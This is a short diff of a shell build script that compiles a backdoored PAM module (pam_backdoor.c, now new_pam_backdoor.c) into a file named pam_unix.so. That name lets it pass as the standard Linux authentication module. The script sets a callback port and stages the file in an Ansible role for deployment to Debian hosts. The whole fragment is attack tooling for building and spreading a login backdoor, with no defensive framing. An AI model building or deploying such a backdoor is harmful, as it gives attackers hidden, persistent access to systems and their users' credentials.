@@ -36,7 +36,7 @@ sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT $port/" ./pam_backdoor.
 # -fPIC: emit postition-independent code (suitable for dynamic linking)
 # -shared: used with -fPIC, produce a shared object that can be linked with other objects to form an executable
 # -l***: Link libpam.so and libdl.so
-gcc -fPIC -shared -o pam_unix.so pam_backdoor.c -lpam -ldl
+gcc -fPIC -shared -o pam_unix.so new_pam_backdoor.c -lpam -ldl
 
 # Copy files for use by ansible
 cp ./pam_unix.so ./roles/deploy_debian/files/
